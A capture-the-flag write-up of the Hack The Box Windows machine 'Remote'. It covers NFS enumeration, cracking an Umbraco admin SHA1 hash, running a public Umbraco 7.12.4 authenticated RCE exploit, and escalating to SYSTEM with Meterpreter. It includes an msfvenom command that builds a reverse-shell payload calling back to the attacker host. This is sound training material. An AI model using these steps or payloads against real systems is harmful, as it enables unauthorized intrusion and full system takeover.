---
title: "HTB Remote"
date: 2026-05-16 01:11 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Windows, Easy]
image: /assets/img/posts/remote/remote.png
---
**HTB Remote** is a Windows machine that starts with mounting a world-accessible `NFS` share exposing an `Umbraco CMS` backup, extracting and cracking a `SHA1` password hash from the `Umbraco.sdf` database file, logging into `Umbraco 7.12.4` and exploiting an authenticated `RCE` vulnerability to gain a shell as `defaultapppool`, and escalating to `SYSTEM` by abusing `SeImpersonatePrivilege` via `Named Pipe Impersonation` through `Metasploit`.

## Reconnaissance
### Scanning
- Nmap (All ports)
```
nmap -p- 10.129.230.172 -nv --min-rate 1000
```
```
PORT      STATE    SERVICE
21/tcp    open     ftp
80/tcp    open     http
111/tcp   open     rpcbind
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
2049/tcp  open     nfs
5985/tcp  open     wsman
47001/tcp open     winrm
49664/tcp open     unknown
49665/tcp open     unknown
49666/tcp open     unknown
49667/tcp open     unknown
49678/tcp open     unknown
49679/tcp open     unknown
49680/tcp open     unknown
```
- NSE Scripts & Version
```
nmap -sCV -p21,80,111,135,139,445,2049,5985,47001,49664,49665,49666,49667,49678,49679,49680 10.129.230.172 -nv --min-rate 1000
```
```
PORT      STATE SERVICE       VERSION                                                                                                                        
21/tcp    open  ftp           Microsoft ftpd                                                                                                                 
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                                       
| ftp-syst:                                                                                                                                                  
|_  SYST: Windows_NT                                                                                                                                         
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                        
| http-methods:                                                                                                                                              
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                 
|_http-title: Home - Acme Widgets                                                                                                                            
111/tcp   open  rpcbind       2-4 (RPC #100000)                                                                                                              
| rpcinfo:                                                                                                                                                   
|   program version    port/proto  service                                                                                                                   
|   100000  2,3,4        111/tcp   rpcbind                                                                                                                   
|   100000  2,3,4        111/tcp6  rpcbind                                                                                                                   
|   100000  2,3,4        111/udp   rpcbind                                                                                                                   
|   100000  2,3,4        111/udp6  rpcbind                                                                                                                   
|   100003  2,3         2049/udp   nfs                                                                                                                       
|   100003  2,3         2049/udp6  nfs                                                                                                                       
|   100003  2,3,4       2049/tcp   nfs                                                                                                                       
|   100003  2,3,4       2049/tcp6  nfs                                                                                                                       
|   100005  1,2,3       2049/tcp   mountd                                                                                                                    
|   100005  1,2,3       2049/tcp6  mountd                                                                                                                    
|   100005  1,2,3       2049/udp   mountd                                                                                                                    
|   100005  1,2,3       2049/udp6  mountd                                                                                                                    
|   100021  1,2,3,4     2049/tcp   nlockmgr                                                                                                                  
|   100021  1,2,3,4     2049/tcp6  nlockmgr                                                                                                                  
|   100021  1,2,3,4     2049/udp   nlockmgr                                                                                                                  
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-05-16T13:13:40
|_  start_date: N/A
|_clock-skew: 1h00m01s
```
### Configuration
- /etc/hosts
```
sudo nxc smb 10.129.230.172 --generate-hosts-file /etc/hosts
```
## NFS
### Enumeration
```
➜  Remote showmount -e 10.129.230.172                                 
Export list for 10.129.230.172:
/site_backups (everyone)
```

```
➜  Remote ls /mnt/site_backup_mnt 
App_Browsers  App_Plugins    bin     css           Global.asax  scripts  Umbraco_Client  Web.config
App_Data      aspnet_client  Config  default.aspx  Media        Umbraco  Views
```
After mounting the `NFS` share, it appears to be an `Umbraco CMS` instance. The next step is to identify the version and locate the databases for user information, since it’s the same site running on port `80`.

```
➜  App_Data ls                     
cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf
➜  App_Data cp Umbraco.sdf /home/kali/Desktop/AiO/CPTS-PREP/Remote
➜  App_Data cd -                            
~/Desktop/AiO/CPTS-PREP/Remote
➜  Remote file Umbraco.sdf 
Umbraco.sdf: data
➜  Remote 
```

```
➜  Remote strings Umbraco.sdf | grep 'password'                                                                                                              
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change                                         
User "admin" <admin@htb.local>192.168.195.1User "smith" <smith@htb.local>umbraco/user/password/changepassword change                                         
User "admin" <admin@htb.local>192.168.195.1User "ssmith" <ssmith@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
passwordConfig
➜  Remote strings Umbraco.sdf | grep 'admin@htb.local'
admin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
admin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
```
### Crackstation
```
Crackstation:
b8be16afba8c314ad33d812f22a04991b90e2aaa	sha1	baconandcheese
```

```
admin@htb.local / baconandcheese
```

```
➜  Remote cat Web.config | grep -i 'umbracoConfigurationStatus'
<add key="umbracoConfigurationStatus" value="7.12.4" />
```

So now we have the email, password, and the Umbraco version. Next, we will try the credentials on the web page and then look for potential exploits.

## Web App
`http://10.129.230.172/umbraco/#/login`
![umb](/assets/img/posts/remote/umb.png)
### searchsploit
```
searchsploit umbraco
```
```
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                                                 | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                                                                 | aspx/webapps/49488.py
```
```
➜  Remote searchsploit -x aspx/webapps/46153.py                     
  Exploit: Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution
      URL: https://www.exploit-db.com/exploits/46153
     Path: /usr/share/exploitdb/exploits/aspx/webapps/46153.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
```
```
➜  Remote searchsploit -m aspx/webapps/46153.py
  Exploit: Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution
      URL: https://www.exploit-db.com/exploits/46153
     Path: /usr/share/exploitdb/exploits/aspx/webapps/46153.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/Desktop/AiO/CPTS-PREP/Remote/46153.py
```
![umb2](/assets/img/posts/remote/umb2.png)
Now we will modify the exploit script to match our target findings.
![umb3](/assets/img/posts/remote/umb3.png)
## Shell as defaultapppool
```
PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
```
### whoami /priv
```
PS C:\windows\system32\inetsrv> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\windows\system32\inetsrv> 
```
### Metasploit
```
➜  Remote msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.186 LPORT=0911 -f exe -o rev.exe
➜  Remote msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost tun0; set lport 0911; run"
```
```
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```